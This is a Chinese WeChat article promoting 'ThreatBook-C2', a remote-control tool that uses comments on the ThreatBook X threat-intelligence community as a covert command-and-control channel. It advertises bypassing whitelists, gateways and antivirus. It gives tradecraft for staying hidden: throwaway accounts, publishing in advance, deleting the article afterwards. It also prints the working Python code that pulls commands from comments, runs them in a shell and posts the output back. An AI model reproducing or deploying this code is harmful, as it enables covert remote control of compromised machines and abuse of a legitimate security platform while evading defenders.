<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4ZYnD-1rfpmRSNmfAL3rNA)

  

此文章是昱子师傅的投稿。昱子师傅，经常编写 / 魔改各种小脚本小工具，研究红蓝对抗，喜欢研究各种奇怪花活姿势。

github 地址：https://github.com/yuziiiiiiiiii

  

  

sdfd

01

工具简介

  

 **- 项目名称：** yuziiiiiiiiii/ThreatBook-C2

**- 项目地址：**

```
https://github.com/yuziiiiiiiiii/ThreatBook-C2

```

**- 项目描述：**

微步的 X 情报社区具有信息分享、传播及获取的功能，用户发表的信息是公开的信息，其他第三方均可以通过 X 情报社区获取用户发表的信息。在众多的攻防演练中常用于溯源，分析恶意 IP，恶意附件等，殊不知也可以利用其天然白名单且免杀的优势做 C2 远控，防不胜防！如今许多企业网络设置了上网行为管理，网关等各种千奇百怪的安全设备，网络只对特定 IP 或域名设置白名单开放，然后限制一切陌生流量，这样则会导致即使对 C2 做了云函数，CDN，域前置，IPv6 等各种技术实现了隐匿但是流动不起来，无法上线，此时则需要一个天然白名单做 C2，不仅隐匿性杠杠滴，还无视各种安全设备，从而直接远控！

 **- 项目优点：**

利用社区过流量监测。

02

演示  

  

01

桌面端

 视频太大了，上他 github 看吧。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMtuG7Sj09AU5sQf28wYqAIE3FvbQCHyQUmY6rsWB7SHjjlEV2vA94hyd5iah1ia75qdmC31sjAHJvYQ/640?wx_fmt=png&from=appmsg&random=0.05938260839734144&random=0.13885894560180012&random=0.16845690187435824)

02

移动端  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMtuG7Sj09AU5sQf28wYqAIEwMmHHVgAoIGAbwwlNDq7kjjZ0I7icIibcIbpqgSuicoKRMVChm6HHOPsw/640?wx_fmt=png&from=appmsg&random=0.4362975641046154&random=0.6440693032289972&random=0.5372552535621744)

03

流量分析

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMtuG7Sj09AU5sQf28wYqAIEibERrSPc4yq6fOfvKFjiaN2ibNl7dlzcT606fCc7vls1TUr4SnBBjYnlA/640?wx_fmt=png&from=appmsg&random=0.829843559820975&random=0.8350366909632301)

根据流量包，可以看出和 C2 的通讯 IP 为 117.50.19.28 是微步社区的 IP，企业内为默认白名单 IP，因此 IP 上不仅做到了隐匿也做到了与企业间可通信。流量走 https 加密流量，命令间存在心跳时间

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMtuG7Sj09AU5sQf28wYqAIEKN66agPzfjMONj3vDdNoVLX2d4Hq5f3xvXic4BGuupD40gibIgjFOhMg/640?wx_fmt=png&from=appmsg&random=0.0830955979561292&random=0.5825055583013778)

04

实操运用

  

*    一个微步社区正常的账号（可以创建干净的小号，进一步增强隐匿性）
    
*   发布一篇微步社区文章（建议提前几天准备好，临时发布的文章曝光度高，容易被其他人看见），建议提前将命令输入评论区（命令格式是 "命令 + 真正的命令"），避免踩空
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMtuG7Sj09AU5sQf28wYqAIErvDEicfmEmyic5uyAia9GKFh7whtEuO5kZyaicdy98trCUXlrD2wibsHDTw/640?wx_fmt=png&from=appmsg&random=0.5366246447592333)

*   记录下关键信息
    

微步社区的文章 ID

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMtuG7Sj09AU5sQf28wYqAIEiaiadl5gXy4jWQCjBpicP6XUUISqqOl16h8CSicHGNtl7sjQrUrLsz89ew/640?wx_fmt=png&from=appmsg&random=0.48433463625129614)  

微步社区的验证字段 **csrfToken**、**rememberme**、**xx-csrf**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMtuG7Sj09AU5sQf28wYqAIEELmTsVr8QSlOtOhicaFWlibAficqibecOViaCVibhrRMGJgsXaBHC97iaNuIQ/640?wx_fmt=png&from=appmsg&random=0.8828193026664206)

将关键信息填入 config.ini 中

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMtuG7Sj09AU5sQf28wYqAIERo3UWuqKhoNmeTmeZDASGzN0qMIibUibhAGA1lYACtXTcDCnX7Nzl97g/640?wx_fmt=png&from=appmsg&random=0.8183508256953809)

同目录下运行 C2.exe（目测无视一切杀软执行命令且回显），这时候回到微步社区文章页面进行刷新，会发现命令已经回显

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMtuG7Sj09AU5sQf28wYqAIEWIC76TaWv26ysibN5rgQWN1wj4a8oRURpMmYev5BEK4ibjia03BUTzRRg/640?wx_fmt=png&from=appmsg&random=0.5628627107523589)

若需要再次执行命令只需要在评论区按格式输入命令，等待心跳时间后，即可以获取下一个命令回显（默认设置的是 5s 心跳时间）

结束远控后，及时保留关键信息并且将文章删除即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMtuG7Sj09AU5sQf28wYqAIEZbkT0gWU5JPpRhVspR8K2SiaHLujuPOaYFo5nJ4AB1HrZib2TQQt7UEw/640?wx_fmt=png&from=appmsg&random=0.1544603588447695)

05

关键实现  

  

  此基于微步社区的远控，主要实现上利用了三个核心代码，分别为获取命令、回显命令、执行命令，以下我们来逐一解析

1. 获取命令  

```
def get_comments(short_message_id):
    base_url = "https://x.threatbook.com/v5/node/user/article/queryComments?shortThreatId="+short_message_id
    try:
      #模拟用户发包
        response = requests.get(base_url)
        # 直接使用 response.json() 获取对象
        json_object = response.json()
        # 定义一个评论列表
        comments_list = json_object["data"]["list"]
        # 提取第一个 comments 对应的值
        first_comment = comments_list[0]["comments"]
        # 返回第一个 comments 对应的值
        return first_comment
        # 错误性判断
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

```

2. 回显命令

```
def send_comment(comment, short_message_id, csrf_token, rememberme, xx_csrf):
    url = "https://x.threatbook.com/v5/node/user/article/saveComment"
  #请求头
    headers = {
        "Host": "x.threatbook.com",
        "Cookie": f"csrfToken={csrf_token}; rememberme={rememberme}; xx-csrf={xx_csrf}",
        "Content-Type": "application/json",
        "X-Csrf-Token": csrf_token,
        "Xx-Csrf": xx_csrf,
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
    }
  #请求体
    data = {
        "comment": comment,
        "isAnonymous": "False",
        "targetId": "0",
        "shortMeaasgeId": short_message_id
    }
  #回显命令
    try:
        response = requests.post(url, json=data, headers=headers)
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

```

3. 执行命令

```
  def command(cmd):
  #Popen()函数使用shell执行命令，stdout和stderr是子进程的标准输出和标准错误输出
    process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
    #启动并等待子进程完成，通过stdout和stderr读取子进程的输出
    stdout, stderr = process.communicate()
    #返回标准输出并解码为gbk编码的字符串
    return stdout.decode('gbk')

```